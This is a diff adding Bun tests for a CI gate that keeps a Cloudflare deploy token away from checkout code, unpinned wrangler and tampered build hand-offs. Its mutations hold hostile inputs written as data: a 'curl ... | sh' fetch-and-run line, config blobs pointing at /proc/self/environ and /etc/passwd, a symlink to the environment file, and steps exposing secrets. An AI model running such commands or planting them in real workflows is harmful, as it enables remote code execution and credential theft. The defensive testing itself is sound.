@@ -1,7 +1,10 @@
-import { afterAll, describe, expect, test } from 'bun:test';
-import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { afterAll, describe, expect, setDefaultTimeout, test } from 'bun:test';
+import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
+
+// Every test runs the whole gate (yq and jq over every workflow) at least once, and a loaded host takes seconds for it.
+setDefaultTimeout(120_000);
 
 const repository = join(import.meta.dir, '../..');
 const scratch: string[] = [];
@@ -1206,5 +1209,538 @@ describe('the Pages project answer leaves the token job only as what the decisio
       result: { name: 'ferretry-v5', canonical_deployment: { id: 'x', url: 'u', project_name: 'ferretry-v5' } },
     }) as { result: { canonical_deployment: { deployment_trigger: unknown } } };
     expect(kept.result.canonical_deployment.deployment_trigger).toEqual({ metadata: {} });
+  });
+});
+
+// End-list E11. The PRODUCTION token (repository-level CLOUDFLARE_API_TOKEN) is also read by the two hosted-Worker
+// workflows. Each of these mutations is the shape those workflows had before (a token job that checks out and runs
+// `nix develop`), or a one-step slide back to it; every one was GREEN under the PWA-only guard.
+describe('the Cloudflare token never meets checkout code (the hosted relay and link-store workflows)', () => {
+  const workers = [
+    { file: '.github/workflows/relay-hosted.yaml', tokenJob: 'deploy' },
+    { file: '.github/workflows/relay-hosted.yaml', tokenJob: 'tunnel-accounts' },
+    { file: '.github/workflows/link-store-hosted.yaml', tokenJob: 'deploy' },
+  ];
+  const message = 'the token must never meet checkout code';
+  const checkoutSha = 'actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09';
+
+  const refused = (file: string, mutate: (text: string) => string, expected: string) => {
+    const result = gate(
+      checkout(p => {
+        writeFileSync(p(file), mutate(readFileSync(p(file), 'utf8')));
+      }),
+    );
+    expect(result.status).toBe(1);
+    expect(result.err).toContain(expected);
+  };
+  const addStep = (job: string, step: string) => (text: string) => {
+    const at = text.indexOf(`\n  ${job}:\n`) + 1;
+    const steps = text.indexOf('    steps:\n', at) + '    steps:\n'.length;
+    return `${text.slice(0, steps)}${step}${text.slice(steps)}`;
+  };
+
+  test('this checkout passes: the jobs that hold the token have no checkout code, and the build jobs hold no secret', () => {
+    expect(gate(checkout())).toMatchObject({ status: 0 });
+    for (const file of new Set(workers.map(w => w.file))) {
+      const text = readFileSync(join(repository, file), 'utf8');
+      const jobs = text.split(/^ {2}(?=[a-z][a-z-]*:\n)/mu).filter(job => /secrets\.CLOUDFLARE/u.test(job));
+      expect(jobs.length).toBeGreaterThan(0);
+      for (const job of jobs) {
+        const code = job.replace(/^\s*#.*$/gmu, '');
+        expect(code).not.toMatch(/actions\/checkout|uses: \.\/|nix develop|\bbunx?\b|\bnpx\b/u);
+      }
+    }
+  });
+
+  for (const { file, tokenJob } of workers) {
+    const name = `${file} (${tokenJob})`;
+
+    test(`${name}: an actions/checkout step in the token job is refused`, () => {
+      refused(
+        file,
+        addStep(
+          tokenJob,
+          `      - uses: ${checkoutSha} # v5.1.0\n        with:\n          persist-credentials: false\n`,
+        ),
+        message,
+      );
+    });
+
+    test(`${name}: the nix installer in the token job is refused`, () => {
+      refused(file, addStep(tokenJob, '      - uses: ./.github/actions/install-nix\n'), message);
+    });
+
+    test(`${name}: nix develop, bun, bunx or npx in a token job's run step is refused`, () => {
+      for (const command of ['nix develop .#ci -c true', 'bun install', 'bunx wrangler --version', 'npx wrangler']) {
+        refused(file, addStep(tokenJob, `      - name: sneaky\n        run: ${command}\n`), message);
+      }
+    });
+
+    test(`${name}: wrangler that is not installed at the pinned version first is refused`, () => {
+      refused(
+        file,
+        text => text.replace(/--save-exact "wrangler@\$\{WRANGLER_VERSION\}"/gu, '--save-exact wrangler@latest'),
+        'WRANGLER_VERSION',
+      );
+      refused(file, text => text.replace(/ --ignore-scripts/gu, ''), 'without first installing');
+    });
+  }
+
+  test('a wrangler deploy in a token job without --no-bundle (it would bundle the handed-over module itself) is refused', () => {
+    for (const file of ['.github/workflows/relay-hosted.yaml', '.github/workflows/link-store-hosted.yaml']) {
+      refused(file, text => text.replace(/ --no-bundle/u, ''), '--no-bundle');
+    }
+  });
+
+  test('a build job that has the checkout and reads any secret is refused', () => {
+    for (const file of ['.github/workflows/relay-hosted.yaml', '.github/workflows/link-store-hosted.yaml']) {
+      refused(
+        file,
+        addStep(
+          'build',
+          '      - name: leak\n        env:\n          LEAK: ${{ secrets.HOSTED_TUNNEL_ACCOUNTS }}\n        run: echo leak\n',
+        ),
+        'the build job must hold none',
+      );
+    }
+  });
+
+  test('a secret in a token job-level env (so the install step holds it) is refused', () => {
+    for (const { file, tokenJob } of workers) {
+      refused(
+        file,
+        text => {
+          const at = text.indexOf(`\n  ${tokenJob}:\n`) + 1;
+          const runsOn = text.indexOf('    runs-on:', at);
+          return `${text.slice(0, runsOn)}    env:\n      LEAK: \${{ secrets.CLOUDFLARE_API_TOKEN }}\n${text.slice(runsOn)}`;
+        },
+        'job-level env',
+      );
+    }
+  });
+
+  test('every workflow that holds the token pins the same wrangler', () => {
+    refused(
+      '.github/workflows/relay-hosted.yaml',
+      text => text.replace(/WRANGLER_VERSION: [^\n]+/u, 'WRANGLER_VERSION: 4.92.0'),
+      'pin different wrangler versions',
+    );
+    refused(
+      '.github/workflows/link-store-hosted.yaml',
+      text => text.replace(/WRANGLER_VERSION: [^\n]+/u, 'WRANGLER_VERSION: 4.92.0'),
+      'pin different wrangler versions',
+    );
+  });
+
+  test('a hosted-Worker workflow that no longer reads the token at all fails instead of passing vacuously', () => {
+    refused(
+      '.github/workflows/link-store-hosted.yaml',
+      text => text.replace(/secrets\.CLOUDFLARE_/gu, 'secrets.RENAMED_'),
+      'no job reads a CLOUDFLARE secret',
+    );
+  });
+
+  test('a removed hosted-Worker workflow is refused, not skipped', () => {
+    const result = gate(checkout(p => rmSync(p('.github/workflows/link-store-hosted.yaml'))));
+    expect(result.status).toBe(1);
+    expect(result.err).toContain('link-store-hosted.yaml is missing');
+  });
+
+  describe('a wrangler invocation by path or through node is a wrangler invocation', () => {
+    const forms = {
+      'a quoted path to the pinned install': '"${RUNNER_TEMP}/wrangler/node_modules/.bin/wrangler"',
+      'an unquoted path': '${RUNNER_TEMP}/wrangler/node_modules/.bin/wrangler',
+      'node on the entry script': 'node "${RUNNER_TEMP}/wrangler/node_modules/wrangler/wrangler-dist/cli.js"',
+      'node on the bin script': 'node ${RUNNER_TEMP}/wrangler/node_modules/wrangler/bin/wrangler.js',
+    };
+    const relayFile = '.github/workflows/relay-hosted.yaml';
+    const linkStoreFile = '.github/workflows/link-store-hosted.yaml';
+    // One gate run costs seconds, so each form is held on the relay workflow and the first and last also on the link store's.
+    const cases = Object.entries(forms).flatMap(([form, invocation], index) =>
+      index === 0 || index === 2
+        ? [
+            { file: relayFile, form, invocation },
+            { file: linkStoreFile, form, invocation },
+          ]
+        : [{ file: relayFile, form, invocation }],
+    );
+    for (const { file, form, invocation } of cases) {
+      test(`${file}: ${form} runs wrangler before it is installed and is refused`, () => {
+        refused(
+          file,
+          addStep('deploy', `      - name: early\n        run: |\n          ${invocation} --version\n`),
+          'without first installing',
+        );
+      }, 60_000);
+      test(`${file}: ${form} deploying without --no-bundle is refused`, () => {
+        refused(
+          file,
+          addStep(
+            'deploy',
+            `      - name: bundle again\n        run: |\n          ${invocation} deploy --config wrangler.json\n`,
+          ),
+          '--no-bundle',
+        );
+      }, 60_000);
+    }
+    test('the tunnel-accounts job refuses a wrangler run by path before the install, too', () => {
+      refused(
+        relayFile,
+        addStep(
+          'tunnel-accounts',
+          `      - name: early\n        run: |\n          ${forms['an unquoted path']} --version\n`,
+        ),
+        'without first installing',
+      );
+    }, 60_000);
+    test('a path or node deploy WITH --no-bundle on its line passes the --no-bundle rule', () => {
+      for (const invocation of [forms['a quoted path to the pinned install'], forms['node on the entry script']]) {
+        const result = gate(
+          checkout(p => {
+            const path = p(relayFile);
+            writeFileSync(
+              path,
+              addStep(
+                'deploy',
+                `      - name: install first\n        run: |\n          ${invocation} deploy --config wrangler.json --no-bundle\n`,
+              )(readFileSync(path, 'utf8')),
+            );
+          }),
+        );
+        expect(result.err).not.toContain('must pass --no-bundle');
+      }
+    }, 60_000);
+    test('two deploys on one run step, only one with --no-bundle, is refused', () => {
+      refused(
+        linkStoreFile,
+        addStep(
+          'deploy',
+          '      - name: two\n        run: |\n          wrangler deploy --no-bundle\n          "${RUNNER_TEMP}/wrangler/node_modules/.bin/wrangler" deploy\n',
+        ),
+        '--no-bundle',
+      );
+    }, 60_000);
+  });
+
+  describe('a token job runs nothing it did not install (no shell, source or node on a file)', () => {
+    const commands = [
+      'bash ./worker.sh',
+      'bash -c "true"',
+      'sh ./worker.sh',
+      '/bin/bash "${RUNNER_TEMP}/relay-bundle/x.sh"',
+      'source "${RUNNER_TEMP}/relay-bundle/x.sh"',
+      '. "${RUNNER_TEMP}/relay-bundle/x.sh"',
+      'node "${RUNNER_TEMP}/relay-bundle/worker.js"',
+      'node ./x.js',
+      'env bash ./x.sh',
+      'curl --silent https://example.invalid/x | sh',
+      'true; sh ./x.sh',
+      '(bash ./x.sh)',
+    ];
+    // One gate run costs seconds: every spelling is held on the relay's deploy job, the other token jobs get two.
+    for (const command of commands) {
+      test(`relay-hosted.yaml (deploy): \`${command}\` is refused`, () => {
+        refused(
+          '.github/workflows/relay-hosted.yaml',
+          addStep('deploy', `      - name: sneaky\n        run: |\n          ${command}\n`),
+          'runs bash, sh, source or node',
+        );
+      }, 60_000);
+    }
+    for (const { file, tokenJob } of workers.filter(w => w.tokenJob !== 'deploy' || w.file.includes('link-store'))) {
+      test(`${file} (${tokenJob}): a shell script and node on a file are refused`, () => {
+        for (const command of ['bash ./worker.sh', 'node ./x.js']) {
+          refused(
+            file,
+            addStep(tokenJob, `      - name: sneaky\n        run: |\n          ${command}\n`),
+            'runs bash, sh, source or node',
+          );
+        }
+      }, 60_000);
+    }
+    for (const { file, tokenJob } of workers.slice(0, 1)) {
+      test(`${file} (${tokenJob}): inline node code and sha256sum are not mistaken for it`, () => {
+        const result = gate(
+          checkout(p => {
+            const path = p(file);
+            writeFileSync(
+              path,
+              addStep(
+                tokenJob,
+                '      - name: fine\n        run: |\n          node -p "1+1"\n          printf x | sha256sum\n          node --print 2\n',
+              )(readFileSync(path, 'utf8')),
+            );
+          }),
+        );
+        expect(result.err).not.toContain('runs bash, sh, source or node');
+      });
+    }
+  });
+
+  describe('the build artifact is not trusted: the token job verifies the hand-off before any step that has the token', () => {
+    const relay = '.github/workflows/relay-hosted.yaml';
+    const linkStore = '.github/workflows/link-store-hosted.yaml';
+    const allowList = /HANDOFF_CONFIG_KEYS: '\[([^\]]*)\]'/u;
+    const files = [relay, linkStore];
+
+    test('an allow-list with a build or blob key is refused, in each workflow', () => {
+      for (const file of files) {
+        for (const key of ['build', 'data_blobs', 'wasm_modules', 'text_blobs']) {
+          refused(
+            file,
+            text => text.replace(allowList, (_m, keys) => `HANDOFF_CONFIG_KEYS: '[${keys},"${key}"]'`),
+            'HANDOFF_CONFIG_KEYS',
+          );
+        }
+      }
+    });
+
+    test('a workflow whose allow-list is missing a key, or is gone, is refused', () => {
+      for (const file of files) {
+        refused(file, text => text.replace('"observability",', ''), 'HANDOFF_CONFIG_KEYS');
+        refused(file, text => text.replace(allowList, ''), 'HANDOFF_CONFIG_KEYS');
+      }
+    });
+
+    test('a step or a job that overrides the allow-list is refused', () => {
+      for (const file of files) {
+        refused(
+          file,
+          addStep(
+            'deploy',
+            '      - name: shadow\n        env:\n          HANDOFF_CONFIG_KEYS: \'["build"]\'\n        run: echo shadow\n',
+          ),
+          'HANDOFF_CONFIG_KEYS',
+        );
+      }
+    });
+
+    test('a token job that stops verifying the hand-off is refused, one rule at a time', () => {
+      const expected = 'must verify it';
+      for (const file of files) {
+        const name = file === relay ? 'ferretry-hosted-relay' : 'ferretry-hosted-link-store';
+        const rules: Array<[string, (text: string) => string]> = [
+          [
+            'the whole verify step is removed',
+            text =>
+              text.replace(
+                / {6}- name: Verify the handed-over bundle\n[\s\S]*?(?= {6}# No token in this step: the install)/u,
+                '',
+              ),
+          ],
+          ['the directory listing is no longer exact (ls -A)', text => text.replace('ls -A | LC_ALL', 'ls | LC_ALL')],
+          ['the key subset check is gone', text => text.replace('((keys - $keys) == []) and ', '')],
+          ['main is no longer pinned to the bundle', text => text.replace(' and .main == "worker.js"', '')],
+          ['the name is no longer pinned', text => text.replace(' and .name == $name', '')],
+          [
+            'the name is pinned to another Worker',
+            text => text.replace(`--arg name ${name} `, '--arg name another-worker '),
+          ],
+        ];
+        for (const [, mutate] of rules) refused(file, mutate, expected);
+      }
+    });
+
+    test('a verify step that itself holds a secret, or sits after the first step that does, is refused', () => {
+      for (const file of files) {
+        refused(
+          file,
+          text =>
+            text.replace(
+              '      - name: Verify the handed-over bundle\n',
+              '      - name: Verify the handed-over bundle\n        env:\n          LEAK: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n',
+            ),
+          'must verify it',
+        );
+        refused(
+          file,
+          // a step with a secret that comes BEFORE the verify step (the download step stands in for it)
+          text =>
+            text.replace(
+              /( {6}- uses: actions\/download-artifact@[0-9a-f]{40} # v[0-9.]+\n)/u,
+              '$1        env:\n          LEAK: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n',
+            ),
+          'must verify it',
+        );
+      }
+    });
+
+    test('a build job that copies the configuration whole instead of projecting it is refused', () => {
+      for (const file of files) {
+        refused(
+          file,
+          text =>
+            text.replace(
+              /with_entries\(select\(\.key as \$k \| \$keys \| index\(\$k\)\)\) \| \.main = "worker\.js"/u,
+              '.main = "worker.js"',
+            ),
+          'must project the hosted configuration',
+        );
+      }
+    });
+
+    // ── what the steps DO, run for real against fake hand-offs (no token anywhere in these environments) ──────────────
+    const workflowJson = (file: string) => {
+      const result = Bun.spawnSync(['yq', '-o=json', '.', join(repository, file)]);
+      return JSON.parse(result.stdout.toString()) as {
+        env: Record<string, string>;
+        jobs: Record<string, { steps: Array<{ name?: string; run?: string }> }>;
+      };
+    };
+    const stepRun = (file: string, job: string, name: string): string => {
+      const run = workflowJson(file).jobs[job]?.steps.find(step => step.name === name)?.run;
+      if (run === undefined) throw new Error(`${file}: no step "${name}" in job ${job}`);
+      return run;
+    };
+    const handoffs = [
+      {
+        file: relay,
+        source: 'packages/plugins/connections/worker/wrangler.hosted.json',
+        directory: 'relay-bundle',
+        config: 'wrangler.hosted.json',
+        files: ['fingerprint', 'worker.js'],
+        name: 'ferretry-hosted-relay',
+      },
+      {
+        file: linkStore,
+        source: 'packages/plugins/catalogs/worker/wrangler.link-store.hosted.json',
+        directory: 'link-store-bundle',
+        config: 'wrangler.link-store.hosted.json',
+        files: ['worker.js'],
+        name: 'ferretry-hosted-link-store',
+      },
+    ];
+    type Handoff = (typeof handoffs)[number];
+    const bash = (script: string, cwd: string, env: Record<string, string>) => {
+      const result = Bun.spawnSync(['bash', '-c', script], { cwd, env: { PATH: process.env.PATH ?? '', ...env } });
+      return { status: result.exitCode, err: result.stderr.toString() };
+    };
+
+    /** Runs the BUILD step on `repositoryConfig` and returns the hand-off directory it produced. */
+    function build(h: Handoff, repositoryConfig: Record<string, unknown>) {
+      const root = mkdtempSync(join(tmpdir(), 'handoff-'));
+      scratch.push(root);
+      const workspace = join(root, 'ws');
+      const runner = join(root, 'runner');
+      const directory = join(runner, h.directory);
+      mkdirSync(join(workspace, h.source, '..'), { recursive: true });
+      mkdirSync(directory, { recursive: true });
+      writeFileSync(join(workspace, h.source), JSON.stringify(repositoryConfig));
+      const env = { RUNNER_TEMP: runner, HANDOFF_CONFIG_KEYS: workflowJson(h.file).env.HANDOFF_CONFIG_KEYS ?? '' };
+      const projected = bash(stepRun(h.file, 'build', 'Hand over the hosted configuration'), workspace, env);
+      for (const name of h.files)
+        writeFileSync(join(directory, name), name === 'fingerprint' ? 'bundle-0123456789abcdef\n' : '// worker\n');
+      return { directory, workspace, env, projected };
+    }
+    const real = (h: Handoff) =>
+      JSON.parse(readFileSync(join(repository, h.source), 'utf8')) as Record<string, unknown>;
+    const verify = (h: Handoff, built: ReturnType<typeof build>) =>
+      bash(stepRun(h.file, 'deploy', 'Verify the handed-over bundle'), built.workspace, built.env);
+
+    for (const h of handoffs) {
+      const label = h.file.replace('.github/workflows/', '');
+
+      test(`${label}: the build step hands over only allow-listed keys, whatever the repository's file carries`, () => {
+        const poisoned = {
+          ...real(h),
+          build: { command: 'curl https://example.invalid/x | sh' },
+          data_blobs: { SECRET: '../../proc/self/environ' },
+          wasm_modules: { W: '../../x.wasm' },
+          text_blobs: { T: '../../etc/passwd' },
+          rules: [{ type: 'Text', globs: ['**'] }],
+          no_bundle: false,
+          main: 'src/adapters/whatever.ts',
+        };
+        const built = build(h, poisoned);
+        expect(built.projected.status).toBe(0);
+        const handed = JSON.parse(readFileSync(join(built.directory, h.config), 'utf8')) as Record<string, unknown>;
+        const allowed: string[] = JSON.parse(built.env.HANDOFF_CONFIG_KEYS);
+        expect(Object.keys(handed).every(key => allowed.includes(key))).toBe(true);
+        for (const key of ['build', 'data_blobs', 'wasm_modules', 'text_blobs', 'rules', 'no_bundle']) {
+          expect(handed).not.toHaveProperty(key);
+        }
+        expect(handed.main).toBe('worker.js');
+        expect(handed.name).toBe(h.name);
+        expect(verify(h, built)).toMatchObject({ status: 0 });
+      });
+
+      test(`${label}: the real repository configuration is handed over and verifies`, () => {
+        const built = build(h, real(h));
+        expect(built.projected.status).toBe(0);
+        expect(verify(h, built)).toMatchObject({ status: 0 });
+      });
+
+      const tamper = (mutate: (config: Record<string, unknown>) => void) => {
+        const built = build(h, real(h));
+        const path = join(built.directory, h.config);
+        const config = JSON.parse(readFileSync(path, 'utf8')) as Record<string, unknown>;
+        mutate(config);
+        writeFileSync(path, JSON.stringify(config));
+        return verify(h, built);
+      };
+
+      test(`${label}: a configuration key outside the allow-list, put there after the build step, is refused`, () => {
+        for (const [key, value] of [
+          ['build', { command: 'curl https://example.invalid/x | sh' }],
+          ['data_blobs', { SECRET: '../../proc/self/environ' }],
+          ['wasm_modules', { W: '../../proc/self/environ' }],
+          ['text_blobs', { T: '../../proc/self/environ' }],
+          ['rules', []],
+          ['no_bundle', true],
+          ['site', { bucket: '.' }],
+        ] as const) {
+          const result = tamper(config => {
+            config[key] = value;
+          });
+          expect(result.status).toBe(1);
+          expect(result.err).toContain('allow-listed keys');
+        }
+      });
+
+      test(`${label}: a wrong Worker name, a wrong main or a config that is not an object is refused`, () => {
+        expect(
+          tamper(config => {
+            config.name = 'some-other-worker';
+          }).status,
+        ).toBe(1);
+        expect(
+          tamper(config => {
+            config.main = '../../elsewhere.js';
+          }).status,
+        ).toBe(1);
+        expect(
+          tamper(config => {
+            delete config.name;
+          }).status,
+        ).toBe(1);
+        const built = build(h, real(h));
+        writeFileSync(join(built.directory, h.config), '[]');
+        expect(verify(h, built).status).toBe(1);
+      });
+
+      test(`${label}: an extra file (hidden ones too), a missing file, a directory or a link in the hand-off is refused`, () => {
+        for (const extra of ['.env', '.dev.vars', 'wrangler.toml', 'wrangler.json', 'package.json', 'extra.js']) {
+          const built = build(h, real(h));
+          writeFileSync(join(built.directory, extra), 'X=1\n');
+          const result = verify(h, built);
+          expect(result.status).toBe(1);
+          expect(result.err).toContain('the hand-off must hold exactly');
+        }
+        for (const gone of [...h.files, h.config]) {
+          const built = build(h, real(h));
+          rmSync(join(built.directory, gone));
+          expect(verify(h, built).status).toBe(1);
+        }
+        const withDirectory = build(h, real(h));
+        mkdirSync(join(withDirectory.directory, 'node_modules'));
+        expect(verify(h, withDirectory).status).toBe(1);
+        const withLink = build(h, real(h));
+        rmSync(join(withLink.directory, 'worker.js'));
+        symlinkSync('/proc/self/environ', join(withLink.directory, 'worker.js'));
+        const linked = verify(h, withLink);
+        expect(linked.status).toBe(1);
+        expect(linked.err).toContain('regular file');
+      });
+    }
   });
 });
